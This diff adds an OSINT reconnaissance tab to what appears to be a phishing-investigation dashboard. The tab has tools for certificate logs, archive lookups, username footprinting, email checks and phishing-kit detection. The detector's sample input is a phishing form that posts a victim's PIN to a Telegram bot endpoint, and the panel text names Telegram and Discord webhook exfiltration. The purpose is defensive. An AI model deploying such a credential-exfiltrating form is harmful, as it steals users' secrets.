@@ -94,6 +94,10 @@
         <i class="fa-solid fa-fingerprint"></i>
         <span>Evidence Vault (Chain-of-Custody)</span>
       </button>
+      <button onclick="switchTab('osint')" id="tab-btn-osint" class="tab-btn px-3.5 py-2 text-xs font-medium rounded-md transition flex items-center space-x-2 text-slate-400 hover:text-slate-200 hover:bg-slate-800/40">
+        <i class="fa-solid fa-satellite-dish"></i>
+        <span>OSINT Framework Recon</span>
+      </button>
       <button onclick="switchTab('report')" id="tab-btn-report" class="tab-btn px-3.5 py-2 text-xs font-medium rounded-md transition flex items-center space-x-2 text-slate-400 hover:text-slate-200 hover:bg-slate-800/40">
         <i class="fa-solid fa-file-signature"></i>
         <span>Dossier & Takedowns</span>
@@ -812,6 +816,162 @@
               <span>Standard: ICANN RAA Section 3.18 Abuse Response Compliant</span>
               <span class="text-emerald-400"><i class="fa-solid fa-circle-check"></i> Ready to Submit</span>
             </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- TAB 9: OSINT FRAMEWORK & DEEP RECON TOOLKIT (osintframework.com & Elicit research) -->
+    <section id="tab-content-osint" class="tab-content hidden space-y-6">
+      <div class="bg-slate-900/60 border border-slate-800 rounded-xl p-6">
+        <div class="border-b border-slate-800 pb-5">
+          <div class="flex items-center space-x-2">
+            <span class="px-2.5 py-0.5 rounded text-[10px] font-bold bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 font-mono">OSINTFRAMEWORK.COM + ELICIT RESEARCH</span>
+            <span class="text-xs text-slate-400">Next-Gen Threat Intelligence Extensions</span>
+          </div>
+          <h2 class="text-lg font-bold text-white flex items-center space-x-2 mt-1">
+            <i class="fa-solid fa-satellite-dish text-cyan-400"></i>
+            <span>Certificate Transparency, Archive Forensics &amp; Anti-Cloaking Reconnaissance</span>
+          </h2>
+          <p class="text-xs text-slate-400 mt-1">
+            Features tools from OSINTFramework.com (crt.sh, Wayback CDX, Sherlock footprinting) and recent 2024-2026 Elicit-synthesized research (Anti-Cloaking, Form C2 Exfiltration, and XAI Feature Attribution).
+          </p>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 mt-6">
+          <!-- Tool 1: Certificate Transparency Recon (crt.sh) -->
+          <div class="bg-slate-950/60 p-5 rounded-xl border border-slate-800 space-y-3">
+            <div class="flex items-center justify-between">
+              <h3 class="text-sm font-semibold text-white flex items-center space-x-2">
+                <i class="fa-solid fa-certificate text-cyan-400"></i>
+                <span>Certificate Transparency Live Stream (crt.sh)</span>
+              </h3>
+              <span class="text-[10px] text-slate-500 font-mono">RFC 6962 CT Logs</span>
+            </div>
+            <p class="text-xs text-slate-400">
+              Query Certificate Authority append-only logs for newly issued SSL certificates and hidden subdomains before DNS propagation.
+            </p>
+            <div class="flex items-center space-x-2">
+              <input type="text" id="recon-ct-query" value="paypal" placeholder="Brand or Root Domain" class="flex-1 px-3 py-1.5 bg-slate-900 border border-slate-700 rounded text-xs text-white">
+              <button onclick="runCTLogRecon()" class="px-3.5 py-1.5 bg-cyan-600 hover:bg-cyan-500 text-white rounded text-xs font-semibold transition">
+                Query crt.sh
+              </button>
+            </div>
+            <div class="max-h-44 overflow-y-auto border border-slate-800/80 rounded bg-slate-900/60 p-2 font-mono text-xs space-y-1" id="recon-ct-results">
+              <span class="text-slate-500 text-[11px]">Click 'Query crt.sh' to retrieve active certificate logs.</span>
+            </div>
+          </div>
+
+          <!-- Tool 2: Wayback Machine Historical Forensics -->
+          <div class="bg-slate-950/60 p-5 rounded-xl border border-slate-800 space-y-3">
+            <div class="flex items-center justify-between">
+              <h3 class="text-sm font-semibold text-white flex items-center space-x-2">
+                <i class="fa-solid fa-clock-rotate-left text-amber-400"></i>
+                <span>Wayback Machine CDX Archive Forensics</span>
+              </h3>
+              <span class="text-[10px] text-slate-500 font-mono">web.archive.org</span>
+            </div>
+            <p class="text-xs text-slate-400">
+              Examine historical snapshots to detect expired domain drop-catching and sudden repurposing into phishing kits.
+            </p>
+            <div class="flex items-center space-x-2">
+              <input type="text" id="recon-wayback-domain" value="paypal-security-login.top" placeholder="Domain name to inspect" class="flex-1 px-3 py-1.5 bg-slate-900 border border-slate-700 rounded text-xs text-white font-mono">
+              <button onclick="runWaybackRecon()" class="px-3.5 py-1.5 bg-amber-600 hover:bg-amber-500 text-white rounded text-xs font-semibold transition">
+                Inspect CDX
+              </button>
+            </div>
+            <div class="max-h-44 overflow-y-auto border border-slate-800/80 rounded bg-slate-900/60 p-2 text-xs space-y-1.5" id="recon-wayback-results">
+              <span class="text-slate-500 text-[11px]">Click 'Inspect CDX' to query Wayback Machine archives.</span>
+            </div>
+          </div>
+
+          <!-- Tool 3: Multi-Platform Username Footprint (Sherlock / WhatsMyName) -->
+          <div class="bg-slate-950/60 p-5 rounded-xl border border-slate-800 space-y-3">
+            <div class="flex items-center justify-between">
+              <h3 class="text-sm font-semibold text-white flex items-center space-x-2">
+                <i class="fa-solid fa-users-viewfinder text-purple-400"></i>
+                <span>Multi-Platform Handle Recon (Sherlock-Style)</span>
+              </h3>
+              <span class="text-[10px] text-slate-500 font-mono">OSINT Footprinting</span>
+            </div>
+            <p class="text-xs text-slate-400">
+              Actively probe for matching actor footprints across Twitter, Telegram, GitHub, Reddit, Instagram, TikTok, and Medium.
+            </p>
+            <div class="flex items-center space-x-2">
+              <input type="text" id="recon-handle-input" value="@PayPaI_OfficialSupport" placeholder="Target Handle" class="flex-1 px-3 py-1.5 bg-slate-900 border border-slate-700 rounded text-xs text-white font-mono">
+              <button onclick="runHandleFootprintRecon()" class="px-3.5 py-1.5 bg-purple-600 hover:bg-purple-500 text-white rounded text-xs font-semibold transition">
+                Probe Networks
+              </button>
+            </div>
+            <div class="max-h-44 overflow-y-auto border border-slate-800/80 rounded bg-slate-900/60 p-2 text-xs space-y-1 font-mono" id="recon-handle-results">
+              <span class="text-slate-500 text-[11px]">Click 'Probe Networks' to search 9 major platforms.</span>
+            </div>
+          </div>
+
+          <!-- Tool 4: Scammer Email & Disposable Burner Analyzer -->
+          <div class="bg-slate-950/60 p-5 rounded-xl border border-slate-800 space-y-3">
+            <div class="flex items-center justify-between">
+              <h3 class="text-sm font-semibold text-white flex items-center space-x-2">
+                <i class="fa-solid fa-at text-rose-400"></i>
+                <span>Scammer Email &amp; Burner Domain Analyzer</span>
+              </h3>
+              <span class="text-[10px] text-slate-500 font-mono">Holehe / MX Recon</span>
+            </div>
+            <p class="text-xs text-slate-400">
+              Scrutinize sender addresses for burner domains (Mailinator, GuerrillaMail), free webmails, and deceptive local-part prefixes.
+            </p>
+            <div class="flex items-center space-x-2">
+              <input type="text" id="recon-email-input" value="security-alert@service-paypal-center.com" placeholder="email@domain.com" class="flex-1 px-3 py-1.5 bg-slate-900 border border-slate-700 rounded text-xs text-white font-mono">
+              <button onclick="runEmailRecon()" class="px-3.5 py-1.5 bg-rose-600 hover:bg-rose-500 text-white rounded text-xs font-semibold transition">
+                Analyze Email
+              </button>
+            </div>
+            <div class="max-h-44 overflow-y-auto border border-slate-800/80 rounded bg-slate-900/60 p-2 text-xs space-y-1" id="recon-email-results">
+              <span class="text-slate-500 text-[11px]">Click 'Analyze Email' to check provider reputation.</span>
+            </div>
+          </div>
+
+          <!-- Tool 5: Anti-Cloaking & Form Action C2 Exfiltration Detector -->
+          <div class="bg-slate-950/60 p-5 rounded-xl border border-slate-800 space-y-3">
+            <div class="flex items-center justify-between">
+              <h3 class="text-sm font-semibold text-white flex items-center space-x-2">
+                <i class="fa-solid fa-mask text-indigo-400"></i>
+                <span>Anti-Cloaking &amp; Form Action C2 Detector</span>
+              </h3>
+              <span class="text-[10px] text-slate-500 font-mono">Elicit 2025/2026 BDI</span>
+            </div>
+            <p class="text-xs text-slate-400">
+              Detects Telegram Bot API exfiltration, Discord Webhooks, and right-click disabling used in modern evasive phishing kits.
+            </p>
+            <textarea id="recon-c2-html" rows="3" class="w-full px-3 py-1.5 bg-slate-900 border border-slate-700 rounded text-xs text-white font-mono">&lt;form action="https://api.telegram.org/bot7281:AAFe8/sendMessage" method="POST"&gt;&lt;input name="pin"&gt;&lt;/form&gt;</textarea>
+            <button onclick="runCloakingC2Detector()" class="w-full py-1.5 bg-indigo-600 hover:bg-indigo-500 text-white rounded text-xs font-semibold transition">
+              Inspect Form C2 Exfiltration &amp; Cloaking
+            </button>
+            <div class="border border-slate-800/80 rounded bg-slate-900/60 p-2 text-xs space-y-1" id="recon-c2-results">
+              <span class="text-slate-500 text-[11px]">Click to analyze sample phishing kit code.</span>
+            </div>
+          </div>
+
+          <!-- Tool 6: Explainable AI (XAI) Attribution Breakdown -->
+          <div class="bg-slate-950/60 p-5 rounded-xl border border-slate-800 space-y-3 flex flex-col justify-between">
+            <div>
+              <div class="flex items-center justify-between">
+                <h3 class="text-sm font-semibold text-white flex items-center space-x-2">
+                  <i class="fa-solid fa-brain text-emerald-400"></i>
+                  <span>Explainable AI (XAI) Feature Attribution</span>
+                </h3>
+                <span class="text-[10px] text-slate-500 font-mono">SHAP/LIME Metrics</span>
+              </div>
+              <p class="text-xs text-slate-400 mb-2">
+                Transparent factor attribution ranking each signal's exact mathematical contribution to the final risk classification.
+              </p>
+              <div class="space-y-1.5 text-xs" id="recon-xai-results">
+                <!-- Rendered dynamically -->
+              </div>
+            </div>
+            <button onclick="runXAIExplain()" class="w-full py-1.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded text-xs font-semibold transition">
+              Refresh Feature Attribution Matrix
+            </button>
           </div>
         </div>
       </div>
